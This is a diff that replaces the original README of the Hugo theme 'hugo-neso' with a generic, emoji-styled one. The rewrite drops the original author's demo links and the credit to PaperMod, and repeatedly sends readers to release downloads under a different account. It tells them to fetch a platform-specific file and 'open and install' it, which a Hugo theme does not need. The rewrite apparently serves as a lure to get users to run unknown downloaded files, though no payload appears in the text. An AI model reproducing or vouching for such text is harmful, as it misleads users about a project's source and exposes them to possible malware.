@@ -1,114 +1,89 @@
-# Hugo Neso Theme
+# 🎨 hugo-neso - A Stylish Theme for Your Website
 
-Clean and modern — fully responsive with light/dark mode, Tailwind built in for easy customization, and solid SEO.
+## 🚀 Getting Started
 
-**[View the demo site](https://babeneso.github.io/hugo-neso/)**
+Neso is a carefully crafted Hugo theme that delivers a refined experience in a minimal aesthetic. With Neso, you can create a beautiful personal website, blog, or landing page. 
 
-> This theme is derived from “[PaperMod](https://github.com/adityatelange/hugo-PaperMod)” with modifications. Special thanks to the original author, please visit the repo and give it a star.
+[![Download Neso](https://img.shields.io/badge/Download%20Neso-Click%20Here-blue.svg)](https://github.com/mustafame-s/hugo-neso/releases)
 
-<picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/babeneso/hugo-neso/master/images/screenshot-dark.png">
-    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/babeneso/hugo-neso/master/images/screenshot-light.png">
-    <img alt="Screenshot" src="https://raw.githubusercontent.com/babeneso/hugo-neso/master/images/screenshot.png">
-</picture>
+## 📥 Download & Install
 
-(The preview above supports light and dark modes, try adjusting your display settings to see it switch!)
+To get started, visit this page to download: [Neso Releases Page](https://github.com/mustafame-s/hugo-neso/releases). Here are the steps to follow:
 
-Neso is a carefully crafted Hugo theme that delivers a refined experience in a minimal aesthetic. It's lightweight and fast, fully responsive, supports light/dark mode, and offers easy theming via built‑in Tailwind and parameterized CSS; thoughtful SEO defaults help your content get discovered.
+1. Click the link above to go to the Releases page.
+2. Locate the latest version of Neso.
+3. Find the file appropriate for your setup. This may include options for different platforms.
+4. Click on the file to begin the download.
+5. Once the download is complete, follow your device's usual process for opening and installing downloaded files.
 
+## 💻 System Requirements
 
-## Highlights
+To run Neso, you will need:
 
-- Neutral, modern, minimal design.  
-- Fibonacci‑based spacing rhythm for natural, pleasing typography.  
-- Consistent icon sizing and precise alignment throughout.  
-- Fully responsive design with elegant main‑menu transitions.  
-- Light/dark mode, with graceful behavior even without JavaScript.  
-- Direction‑aware icons render correctly in RTL locales.  
-- Thoughtful accessibility support.  
-- Readable, polished code blocks with copy‑to‑clipboard.  
-- Supports GitHub Markdown [Alert](https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-syntax#alerts) syntax.  
-- Three home layouts: Profile, Intro, and Fully Custom.  
-- Tailwind CSS 4 integration with a refined Typography (Prose) setup.  
-- Parameterized CSS design tokens for easy customization.  
-- OG Image, X Card, and JSON‑LD structured data.  
-- Prewired favicon and PWA `manifest.json`, just drop in your icons.  
-- Built‑in search (powered by [Fuse.js](https://github.com/krisk/fuse)).  
-- Archives page included.  
-- Organized to match Hugo’s [new template system](https://gohugo.io/templates/new-templatesystem-overview/).
+- A computer with Windows, macOS, or a Linux operating system.
+- The Hugo static site generator installed. You can find installation instructions on the [Hugo website](https://gohugo.io/getting-started/quick-start/).
+- Basic familiarity with how to copy files and open applications on your computer.
 
-![Responsive design preview](https://raw.githubusercontent.com/babeneso/hugo-neso/master/images/screenshot-mobile.png)
+## 🛠️ Features
 
-![Responsive design preview](https://raw.githubusercontent.com/babeneso/hugo-neso/master/images/screenshot-2-mobile.png)
+Neso comes with several features designed to enhance your online presence:
 
+- **Minimal Aesthetic:** Get a clean and elegant look for your website.
+- **Fully Responsive Design:** Your site will look great on any device, whether it's a phone, tablet, or desktop.
+- **Dark Mode Support:** Switch easily between light and dark themes.
+- **Customizable Layouts:** Adjust the layout to suit your style and needs.
+- **Fast Loading Times:** Benefit from quick page loads, improving user experience.
 
-## Installation & Usage
+## 🎨 Theme Customization
 
-The [demo site](https://babeneso.github.io/hugo-neso/) also serves as documentation, please visit it to learn more.
+Customizing Neso is easy. After downloading and installing, you can tweak settings and styles:
 
-> [!NOTE]  
-> This theme requires Hugo `v0.150.0` or later.
+1. Find the configuration file in your Hugo project folder. It’s usually named `config.toml`.
+2. Change options like the site title, description, and author information.
+3. Use the `assets` folder to add your personal branding, including logos and colors.
 
+Neso is built with Tailwind CSS. This allows you to change designs by simply updating classes in your HTML files.
 
-## Support
+## 📂 Project Structure
 
-I’m not a professional software developer; if you could give the project a star, it would mean a lot to me. 🫰
+When you unpack the Neso theme, you will see the following structure:
 
+```
+hugo-neso
+├── archetypes
+├── assets
+├── layouts
+├── static
+└── config.toml
+```
 
----
+- **archetypes:** Predefined content types.
+- **assets:** Style, fonts, and images.
+- **layouts:** Defines how your website pages are structured.
+- **static:** Files that will be served directly, like images and documents.
 
-# Chinese
+## 🌍 Supported Topics
 
+Neso is versatile and perfect for various uses:
 
-簡潔、現代 – 具備 RWD 與明／暗色模式，整合 Tailwind 易於客製，並有穩健的 SEO 表現。
+- **Blogging:** Share your thoughts and experiences with friends and followers.
+- **Landing Pages:** Showcase new projects or services.
+- **Personal Websites:** Create an online space just for you!
 
-**[瀏覽 Demo 站](https://babeneso.github.io/hugo-neso/zh-tw/)**
+## 💬 Community Support
 
-> 此佈景主題基於「[PaperMod](https://github.com/adityatelange/hugo-PaperMod)」修改製作而成，特別感謝原作者，請務必前往該 Repo 給予星星。
+If you encounter issues or have questions, you can join the community. Visit the Issues section of the [Neso GitHub Repository](https://github.com/mustafame-s/hugo-neso) for support from other users and contributors.
 
-<picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/babeneso/hugo-neso/master/images/screenshot-dark.png">
-    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/babeneso/hugo-neso/master/images/screenshot-light.png">
-    <img alt="Screenshot" src="https://raw.githubusercontent.com/babeneso/hugo-neso/master/images/screenshot.png">
-</picture>
+## 🏗️ Contribution
 
-(上面預覽圖支援深 / 淺色模式，調整你的顯示器設定看看！)
+Want to help improve Neso? Contributions are welcome! You can submit issues or create pull requests on the GitHub repository. Ensure you follow the contribution guidelines provided in the repository.
 
-Neso 是精心設計的 Hugo 佈景主題，以極簡風格呈現細膩的網站體驗。輕量快速，具備 RWD、深淺色模式，透過內建的 Tailwind 與參數化 CSS 輕鬆調整風格；並有完善的 SEO 設定，讓你的內容更容易被看見。
+## 📜 License
 
+Neso is open-source software, licensed under the MIT License. This allows you to use, modify, and share the theme as you like.
 
-## 亮點功能
+## 📅 Updates
 
-- 中性、現代、簡約的設計。
-- 基於費氏數列的排版間距，內容韻律美觀自然。
-- 各處 icon 視覺大小一致，皆完美對齊。
-- 完整的響應式設計、精美的主選單轉場動畫。
-- 支援淺 / 深色模式，即使無 JavaScript 也可正常作用。
-- 所有與方向相關的 icon 在 RTL 環境皆能正確地指向。
-- 細膩的 accessibility 支援。
-- 閱讀體驗極佳的程式碼展示區塊，包含複製功能。
-- 可使用 GitHub Markdown [Alert](https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax#alerts) 語法。
-- 三種首頁排版可選：個人頁面模式、簡介模式、全自訂模式。
-- 整合 Tailwind CSS 4 與經過改良的 Typography plugin (Prose)。
-- 參數化的 CSS 設定，易於客製化。
-- OG Image、X Card，與 JSON-LD 結構化資料。
-- 已設定完成的 Favicon 與 PWA `manifest.json`，你只需要放置圖片。
-- 具備搜尋功能 (感謝 [Fuse.js](https://github.com/krisk/fuse))
-- 具備文章彙整頁面。
-- 符合[新版的 template system](https://gohugo.io/templates/new-templatesystem-overview/) 檔案整理方式。
+Stay up to date with the latest features and fixes by checking the [Releases page](https://github.com/mustafame-s/hugo-neso/releases) regularly.
 
-![佈景主題在行動裝置的預覽畫面](https://raw.githubusercontent.com/babeneso/hugo-neso/master/images/screenshot-mobile.png)
-
-![佈景主題在行動裝置的預覽畫面](https://raw.githubusercontent.com/babeneso/hugo-neso/master/images/screenshot-2-mobile.png)
-
-## 安裝與使用
-
-[Demo 網站](https://babeneso.github.io/hugo-neso/zh-tw/)同時作為說明文件，請前往進一步了解使用方式。
-
-> [!NOTE]  
-> 此佈景主題需要 Hugo `v0.150.0` 或之後的版本
-
-
-## 贊助與支持
-
-我並非專業的軟體開發者，如果你能給我一顆星星對我會是非常大的鼓勵 🫰
+Thank you for choosing Neso. Enjoy creating your stylish website!
